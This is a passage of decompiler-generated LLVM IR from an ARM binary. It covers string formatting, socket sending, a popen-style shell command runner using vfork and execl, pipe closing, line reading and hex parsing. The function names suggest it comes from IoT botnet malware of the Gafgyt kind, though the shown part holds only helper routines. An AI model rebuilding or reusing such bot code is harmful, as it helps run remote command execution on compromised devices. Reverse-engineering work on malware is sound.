  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_31620.38, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_31620.38, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_1af14.40 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1af14.40 to i32), i32 ptrtoint ([3 x i8]* @global_var_1ab10.42 to i32), i32 ptrtoint ([3 x i8]* @global_var_1af1c.44 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp3, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_31620.38, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_31620.38, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_31620.38, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_31620.38, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_31620.38, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1af20.47 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
